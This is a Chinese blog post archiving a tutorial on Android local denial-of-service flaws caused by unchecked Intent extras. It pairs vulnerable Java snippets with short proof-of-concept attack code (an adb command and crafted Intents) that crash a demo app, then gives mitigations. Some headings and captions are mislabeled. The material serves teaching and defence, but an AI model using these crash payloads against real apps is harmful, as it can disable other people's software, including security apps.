---
layout:     post                            # 使用的布局 (不需要修改)
title:      移动应用安全                    # 标题
subtitle:   移动应用开发安全注意事项                 # 副标题
date:       2020-05-14                      # 时间
author:     YuanLe                          # 作者
header-img: img/Australia, Australia_Pacific.jpg         # 这篇文章标题背景图片
catalog: true                               # 是否归档
tags:                                       # 标签
    - 应用拒绝服务
    - 应用漏洞
---

来源：

[Android 应用本地拒绝服务漏洞浅析](https://segmentfault.com/a/1190000002590573)

[渗透中 PoC、Exp、Payload 与 Shellcode 的区别](#https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/)



> 考虑到收藏夹里的博客经常由于不可抗因素失效，因此通过这种搬运的方式来归档，同时也作为一种学习记录，以便日后查询，均在文章开头注明来源，如有侵权，请联系删除。

# ![Table of Contents](https://itx-man.github.io/img/toc.png)

<!-- vim-markdown-toc GFM -->

* [Android 应用本地拒绝服务漏洞浅析](#Android 应用本地拒绝服务漏洞浅析)
  * [安全渗透相关概念](#安全渗透相关概念)
  * [本地拒绝服务漏洞描述](#本地拒绝服务漏洞描述)
  * [本地拒绝服务漏洞影响范围](#本地拒绝服务漏洞影响范围)
  * [本地拒绝服务漏洞详情](#本地拒绝服务漏洞详情)
  * [漏洞详细 POC](#漏洞详细 POC)
  * [本地拒绝服务漏洞修复建议](#本地拒绝服务漏洞修复建议)

<!-- vim-markdown-toc -->

## Android 应用本地拒绝服务漏洞浅析

### 安全渗透相关概念

* PoC

  * 全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。

* Exp

  * 全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。

*  Payload

  * 中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。

* Shellcode

  * 简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。

* 说明

  >几点注意：
  >PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。
  >
  >Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。
  >
  >Shellcode 也有很多种，包括正向的，反向的，甚至 meterpreter。
  >
  >Shellcode 与 Shellshcok 不是一个，Shellshock 特指 14 年发现的 Shellshock 漏洞。
  >
  >
  >
  >另外：
  >在 Metasploit Framework 6 大模块中有一个 Payload 模块，在该模块下有 Single、Stager、Stages 这三种类型，Single 是一个 all-in-one 的 Payload，不依赖其他的文件，所以它的体积会比较大，Stager 主要用于当目标计算机的内存有限时，可以先传输一个较小的 Stager 用于建立连接，Stages 指利用 Stager 建立的连接下载后续的 Payload。Stager 和 Stages 都有多种类型，适用于不同场景。
  >
  >
  >
  >尾巴：
  >想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！



### 本地拒绝服务漏洞描述

Android 系统提供了 Activity、Service 和 Broadcast Receiver 等组件，并提供了 Intent 机制来协助应用间的交互与通讯，Intent 负责对应用中一次操作的动作、动作涉及的数据、附加数据进行描述，Android 系统则根据此 Intent 的描述，负责找到对应的组件，将 Intent 传递给调用的组件，并完成组件的调用。

Android 应用本地拒绝服务漏洞源于程序没有对 Intent.getXXXExtra() 获取的异常或畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或畸形数据来达到使该应用 crash 的目的，简单的说就是攻击者通过 intent 发送空数据、异常或畸形数据给受害者应用，导致其崩溃。

通用型本地拒绝服务可以造成大面积的 app 拒绝服务。通用型本地拒绝服务漏洞，主要源于攻击者向 Intent 中传入其自定义的序列化类对象，当调用组件收到 Extra 序列化类对象时，无法找到此序列化类对象的类定义，因此发生类未定义的异常而导致应用崩溃。

本地拒绝服务漏洞不仅可以导致安全防护等应用的防护功能被绕过或失效（如杀毒应用、安全卫士、防盗锁屏等），而且也可被竞争方应用利用来攻击，使得自己的应用崩溃，造成不同程度的经济利益损失。



### 本地拒绝服务漏洞影响范围

Android 系统所有版本



### 本地拒绝服务漏洞详情

* 1.漏洞位置：处理 getIntent() 的 intent 附带的数据

* 2.漏洞触发前提条件：
  * getIntent() 的 intent 附带空数据、异常或畸形数据
  * 处理 getXXXExtra() 获取的数据时没有进行异常捕获
  
* 3.漏洞原理：Android 系统中提供了 Intent 机制来协助应用间的交互与通讯，其负责对应用中一次操作的动作、动作涉及的数据、附加数据进行描述，系统则根据此 Intent 的描述，负责找到对应的组件，将 Intent 传递给调用的组件，并完成组件的调用。调用的组件在处理 Intent 附加数据的时候，没有进行异常捕获，因此当处理空数据、异常或者畸形数据时，导致应用崩溃。

  

### 漏洞详细 POC

* 1.NullPointException 异常导致的拒绝服务，源于程序没有对 getAction() 等获取到的数据进行空指针判断，从而导致空指针异常而导致应用崩溃；

  * 漏洞应用代码片段

    ```java
    Intent i = new Intent();
    if (i.getAction().equals("TestForNullPointerException")) {
        Log.d("TAG", "Test for Android Refuse Service Bug");
    }
    ```

  * 攻击应用代码片段

    ```powershell
    adb shell am start -n com.alibaba.jaq.pocforrefuseservice/.MainActivity
    ```

  * 攻击应用代码运行后结果截图

    ![NullPointException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-10-19.png)

    ![NullPointException Log](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-11-44.png)
  
* 2.ClassCastException 异常导致的拒绝服务，源于程序没有对 getSerializableExtra() 等获取到数据进行类型判断而进行强制类型转换，从而导致类型转换异常而导致应用崩溃

  * 漏洞应用代码片段

    ```java
    Intent i = getIntent();
    String test = (String)i.getSerializableExtra("serializable_key");
    ```

  * 攻击应用代码片段

    ```java
    Intent i = new Intent();
    i.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
    i.putExtra("serializable_key", BigInteger.valueOf(1));
    startActivity(i);
    ```

  * 攻击应用代码运行后结果截图

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-10-19.png)

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-35-12.png)

* 3.IndexOutOfBoundsException 异常导致的拒绝服务，源于程序没有对 getIntegerArrayListExtra() 等获取到的数据数组元素大小的判断，从而导致数组访问越界而导致应用崩溃

  * 漏洞应用代码片段

    ```java
    Intent intent = getIntent();
    ArrayList<Integer> intArray = intent.getIntegerArrayListExtra("user_id");
    if (intArray != null) {
        for (int i = 0; i < USER_NUM; i++) {
            intArray.get(i);
        }
    }
    ```

  * 攻击应用代码片段

    ```java
    Intent intent = new Intent();
    intent.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
    ArrayList<Integer> user_id = new ArrayList<Integer>();
    intent.putExtra("user_id", user_id);
    startActivity(intent);
    ```

  * 攻击应用代码运行后结果截图

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-10-19.png)

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-39-41.png)

* 4.ClassNotFoundException 异常导致的拒绝服务，源于程序没有无法找到从 getSerializableExtra() 获取到的序列化类对象的类定义，因此发生类未定义的异常而导致应用崩溃

  * 漏洞应用代码片段

    ```java
    Intent i = getIntent();
    i.getSerializableExtra("serializable_key");
    ```

  * 攻击应用代码片段

    ```java
    public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
         Intent i = new Intent();
         i.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
         i.putExtra("serializable_key", new SelfSerializableData());
         startActivity(i);
     }
    static  class SelfSerializableData implements Serializable {
         private static final long serialVersionUID = 42L;
         public SelfSerializableData() {
             super();
         }
     }
    ```

  * 攻击应用代码运行后结果截图

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-10-19.png)

    ![ClassCastException](https://itx-man.github.io/img/source/Snipaste_2020-05-14_15-42-26.png)
    
    

### 漏洞详细 POC

* 1.建议将不必要的导出的组件设置为不导出

  * 出于安全考虑，建议应将不必要的组件导出，防止引起拒绝服务，尤其是杀毒、安全防护、锁屏防盗等安全应用；在AndroidMenifest.xml文件中，将相应组件的 `android:exported`属性设置为 `false`，如下示例：

    ```xml
    <activity android:name="MyActivity"
            android:exported="false">
        <intent-filter>
            <action android:name="android.intent.action_TEST"/>
        </intent-filter>
    </activity>
    ```

* 2.建议intent处理数据时进行捕获异常

  * 建议处理通过 Intent.getXXXExtra() 获取的数据时进行以下判断，以及用 try catch 方式进行捕获所有异常，以防止应用出现拒绝服务漏洞：
    - 空指针异常；
    - 类型转换异常；
    - 数组越界访问异常；
    - 类未定义异常；
    - 其他异常；

---

<div align="center"><img width="192px" height="192px" src="https://itx-man.github.io/img/apple-touch-icon.png"/></div>
